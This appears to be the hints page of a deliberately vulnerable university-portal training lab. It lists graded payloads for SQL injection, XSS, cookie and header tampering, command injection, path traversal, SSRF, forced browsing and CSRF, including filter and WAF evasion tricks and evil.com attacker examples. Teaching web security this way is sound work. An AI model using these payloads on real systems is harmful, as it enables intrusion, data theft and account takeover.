💡 Hints, Explanations & Payloads

Unified exploit reference for all 8 UniMoodle modules (SQLi, XSS, Vault Tampering, RCE, LFI, SSRF, Forced Browsing (URL), and CSRF) across Low, Medium, High, and WAF Bypass.

1. 📊 Gradebook Lookup — SQL Injection (GET /sqli)

WAF Rules: WAF-SQLI-BASIC (L1) | WAF-SQLI-BYPASS (L2)
Low: No filter. | Medium: Blocks spaces (' ') → bypassed with /**/. | High: Blocks spaces, /**/, --, and OR → bypassed with quote-delimited admin'AND'1'='1!
0. Benign Input: alice 1. Launch Low: ' OR '1'='1 2. Launch Medium: admin'/**/oR/**/1=1-- 3. Launch High: admin'AND'1'='1 4. Launch WAF Bypass: admin'AND'a'='a
1. LOW: BOOLEAN TAUTOLOGY Blocked by WAF L1
' OR '1'='1

What it does: Closes the opening quote in WHERE username = '...' and appends OR '1'='1'.

Why it works: Returns all rows in the grades table including the hidden admin exam key.

2. MEDIUM: COMMENT WHITESPACE Bypasses WAF L1
admin'/**/oR/**/1=1--

What it does: Replaces spaces with inline SQL comments (/**/) and truncates the query with --.

Why it works: Both Medium and WAF L1 expect standard spaces (' ') around SQL keywords.

3. HIGH: QUOTE-DELIMITED LOGIC Bypasses WAF L1
admin'AND'1'='1

What it does: Uses single quotes (') as token boundaries around AND without any spaces, comments, or OR.

Why it works: High strips spaces, /**/, --, and OR, but SQLite parses 'admin'AND'1'='1' as valid boolean truth!

🛡️ WAF PARANOIA L1 TEST PAYLOADS (RULE: WAF-SQLI-BASIC):
Blocked by L1 (403): ' OR 1=1 -- | ' UNION SELECT 1,2,3,4,5 -- • Bypasses L1 (Caught only by L2): admin'/**/oR/**/1=1-- | admin'AND'1'='1

2. 💬 Course Forum — Cross-Site Scripting (GET & POST /xss)

WAF Rules: WAF-XSS-BASIC (L1) | WAF-XSS-BYPASS (L2)
Low: No escaping. | Medium: Strips <script> tags → bypassed with <img onerror=...>. | High: Blocks <script>, <img>, onerror, onload → bypassed with HTML5 <details open ontoggle=...>!
1. Launch Low: <script>alert('XSS-Low')</script> 2. Launch Medium: <img src=x onerror=alert('XSS-Medium')> 3. Launch High: <details open ontoggle=alert('XSS-High-Bypass')>High</details> 4. Launch WAF Bypass: <input autofocus onfocus=alert('WAF-Bypass')>
1. LOW: DIRECT SCRIPT TAG Blocked by WAF L1
<script>alert('XSS-Low')</script>

What it does: Injects a direct <script> block into the forum search or comment feed.

Why it works: Low performs zero sanitization. Caught by WAF-XSS-BASIC (L1).

2. MEDIUM: EVENT ATTRIBUTE Bypasses WAF L1
<img src=x onerror=alert('XSS-Medium')>

What it does: Triggers JavaScript via an image load error event instead of a <script> element.

Why it works: Medium only removes <script> tags, and WAF L1 does not inspect event attributes.

3. HIGH: HTML5 ONTOGGLE Bypasses WAF L1
<details open ontoggle=alert('XSS-High-Bypass')>High</details>

What it does: Uses an auto-opening HTML5 <details open> element with ontoggle.

Why it works: High blocks <script>, <img>, onerror, and onload, overlooking <details ontoggle>!

🛡️ WAF PARANOIA L1 TEST PAYLOADS (RULE: WAF-XSS-BASIC):
Blocked by L1 (403): <script>alert(1)</script> | <iframe src=javascript:alert(1)> • Bypasses L1 (Caught only by L2): <img src=x onerror=alert(1)> | <details open ontoggle=alert(1)>

3. 🏛️ Dean's Office Override — Burp Suite Tampering (POST /vault)

WAF Rules: WAF-BAC-BASIC (L1) | WAF-BAC-BYPASS (L2)
Low: Trusts is_admin=true or Cookie: user_role=admin. | Medium: Checks Base64 cookie auth_token=dXNlcj1hZG1pbg== + X-Forwarded-For: 127.0.0.1. | High: Checks unsalted SHA-256 vault_sig + X-Original-URL: /admin/vault!
1. LOW: FORM / COOKIE TAMPER Blocked by WAF L1 
Cookie: user_role=admin
is_admin=true

What it does: Modifies is_admin=true in the POST body or sets Cookie: user_role=admin in Burp Proxy.

Why it works: Low trusts unverified client parameters. Caught by WAF-BAC-BASIC (L1).

2. MEDIUM: BASE64 + XFF HEADER Bypasses WAF L1 
X-Forwarded-For: 127.0.0.1
Cookie: user_role=guest; auth_token=dXNlcj1hZG1pbg==

is_admin=false

What it does: Base64-encodes user=admin (dXNlcj1hZG1pbg==) and adds X-Forwarded-For: 127.0.0.1.

Why it works: WAF L1 does not decode Base64 cookies or inspect proxy headers!

3. HIGH: SHA-256 FORGERY Bypasses WAF L1 
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin/vault
Cookie: user_role=guest; auth_token=dXNlcj1hZG1pbg==; vault_sig={{ admin_unsalted_sha256 }}

is_admin=false

What it does: Forges unsalted sha256("user=admin") in vault_sig + X-Original-URL: /admin/vault.

Why it works: Unsalted SHA-256 without a secret HMAC key can be computed by any attacker. Caught only by WAF L2!

🛡️ WAF PARANOIA L1 TEST PAYLOADS (RULE: WAF-BAC-BASIC):
Blocked by L1 (403): is_admin=true | Cookie: user_role=admin • Bypasses L1 (Caught only by L2): auth_token=dXNlcj1hZG1pbg== + X-Forwarded-For: 127.0.0.1 + X-Original-URL: /admin/vault

4. 💻 Campus Server Diagnostic — Command Injection / RCE (POST /rce)

WAF Rules: WAF-RCE-SHELL-BINARIES (L1) | WAF-RCE-COMMAND-CHAINING (L2)
Low: No filter. Chaining with && whoami executes arbitrary OS commands. | Medium: Blacklists && and ; → bypassed with pipe operator | whoami. | High: Blacklists &&, ;, |, and spaces → bypassed with spaceless concatenation 127.0.0.1&whoami!
1. LOW: && OPERATOR
127.0.0.1 && whoami

Passes standard shell chaining command directly into backend cmd.exe.

2. MEDIUM: PIPE OPERATOR
127.0.0.1 | whoami

Bypasses naive && and ; filters using stdout pipe operator.

3. HIGH: SPACELESS &
127.0.0.1&whoami

Windows command interpreter accepts single ampersand without whitespace padding.

4. WAF BYPASS (L1 EVASION)
127.0.0.1&w'h'o'a'm'i

Evades WAF L1 keyword signature; L2 paranoia decodes and catches invocation.

5. 📄 Course Documents Reader — Path Traversal / LFI (GET /lfi)

WAF Rules: WAF-LFI-PATH-TRAVERSAL (L1) | WAF-LFI-NULL-BYTE (L1)

0. Benign: syllabus_cs404.txt 1. Launch Low: secret_exam_key.txt 2. Launch Medium: ....//....//secret_key 3. Launch High: syllabus_cs404.txt/../../ 4. Launch WAF Bypass: ..%2f..%2f (URL Encoded)
1. LOW: DIRECT ACCESS secret_exam_key.txt

Reads confidential exam key from server root path without restriction.

2. MEDIUM: NESTED ....// ....//....//secret_exam_key.txt

When ../ is removed once, inner ../ remains intact.

3. HIGH: PREFIX OVERRIDE syllabus_cs404.txt/../../secret_key

Satisfies prefix check while path normalization navigates up and back down.

4. WAF BYPASS (URL ENCODING) ..%2f..%2fcourse_files/secret_key

URL-encoded slashes evade raw L1 regex, decoded cleanly by application layer.

6. 🌐 Learning Resource Importer — SSRF (POST /ssrf)

WAF Rules: WAF-SSRF-LOOPBACK (L1) | WAF-SSRF-BYPASS (L2)
Low: No filter. Queries internal loopback http://127.0.0.1:5002/admin/secret-keys. | Medium: Blacklists 127.0.0.1 and localhost → bypassed via decimal IP http://2130706433:5002/admin/secret-keys. | High: Blacklists decimal IP → bypassed with Hex IP http://0x7f000001:5002/... or IPv6 loopback http://[::1]:5002/...!
1. LOW: DIRECT LOOPBACK
http://127.0.0.1:5002/admin/secret-keys

Directly fetches internal microservice endpoint.

2. MEDIUM: DECIMAL IP (DWORD)
http://2130706433:5002/admin/secret-keys

127*(256^3)+1 converts to 2130706433, resolved by OS socket library.

3. HIGH: HEXADECIMAL IP
http://0x7f000001:5002/admin/secret-keys

Hex encoding bypasses string filters while resolving to 127.0.0.1.

4. WAF BYPASS: IPV6 LOOPBACK
http://[::1]:5002/admin/secret-keys

IPv6 loopback passes standard IPv4 WAF signatures.

7. 🧭 Campus Governance & Privileged Consoles — Forced Browsing (GET /portal/<path>)

Broken URL Access Control & Path Traversal
How Defense Levels Work (Change page URL in browser address bar):
• Low: Direct forced browsing: change URL in address bar to /portal/admin-console to access Dean Vance's master console.
• Medium: Blacklists direct admin-console → bypassed via URL-encoding: /portal/%61dmin-console or case evasion: /portal/ADMIN-CONSOLE.
• High: Enforces strict /portal/faculty/ directory prefix → bypassed via URL traversal: /portal/faculty/%2e%2e/admin-console or /portal/faculty/admin-console!
• WAF Bypass: URL encoding /portal/faculty/%2e%2e/admin-console bypasses L1 Coraza rules and triggers L2 SecRule 293013.
• Impossible: Strict Role-Based Access Control (RBAC) verifies cryptographic session token, rejecting unauthorized students regardless of URL.

Launch Medium (Case Evasion): /portal/ADMIN-CONSOLE 3. Launch High (Prefix Escape): /portal/faculty/%2e%2e/admin-console 3b. Launch High (Faculty Prefix): /portal/faculty/admin-console 4. Launch WAF Bypass: /portal/faculty/%2e%2e/admin-console

Direct manual URL editing accesses Dean's hidden administrative console without authorization.

2. MEDIUM: URL ENCODING & CASE /portal/%61dmin-console /portal/ADMIN-CONSOLE

Bypasses naive literal blacklist by using hex encoding (%61=a) or uppercase characters in the URL.

8. ✉️ Notification Email & Profile Settings — CSRF (POST /csrf/change-email)

Cross-Site Request Forgery
How Defense Levels Work:
• Low: Accepts raw POST without token or origin check. Raw HTML form submission changes account email.
• Medium: Checks Referer header contains 127.0.0.1 (can be forged or stripped, e.g. query param).
• High: Checks token from cookie or custom header (X-Requested-With: XMLHttpRequest) → bypassed via HTTP Method Tampering (GET /csrf/change-email?email=...).
• Impossible: Strict POST method + cryptographic synchronizer session CSRF token + SameSite cookies.
4. Launch WAF Bypass: GET Method Tampering
1. LOW: CROSS-SITE FORM
POST /csrf/change-email
email=attacker@evil.com

Unprotected endpoint trusts ambient browser cookies.

2. MEDIUM: REFERER SPOOFING
Referer: http://evil.com/?ref=127.0.0.1

Substring matching in referrer check is fooled by query parameter.

3. HIGH: FORGED CUSTOM HEADER
X-Requested-With: XMLHttpRequest

CORS misconfiguration allows malicious site to set custom headers.

4. WAF BYPASS: METHOD TAMPERING GET /csrf/change-email?...

Backend accepts state changes over GET, bypassing POST CSRF filters.
